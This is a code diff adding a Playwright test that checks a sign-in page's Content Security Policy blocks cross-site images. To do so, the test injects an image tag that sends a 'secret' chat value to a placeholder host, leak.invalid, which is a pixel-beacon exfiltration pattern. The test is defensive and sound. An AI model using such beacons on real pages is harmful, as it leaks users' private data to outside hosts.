@@ -11,3 +11,26 @@ for (const path of ["/sign-in", "/api/auth/ok"]) {
     }
   })
 }
+
+test.describe(() => {
+  // The browser logs the blocked image.
+  test.use({ allowedProblems: [/Content Security Policy/] })
+
+  test("a page won't load an image from another site", async ({ page }) => {
+    await page.goto("/sign-in")
+    const blocked = await page.evaluate(
+      () =>
+        new Promise<string>((resolve) => {
+          document.addEventListener(
+            "securitypolicyviolation",
+            (event) => resolve(event.effectiveDirective),
+            { once: true }
+          )
+          const image = document.createElement("img")
+          image.src = "https://leak.invalid/pixel.png?chat=secret"
+          document.body.appendChild(image)
+        })
+    )
+    expect(blocked).toBe("img-src")
+  })
+})
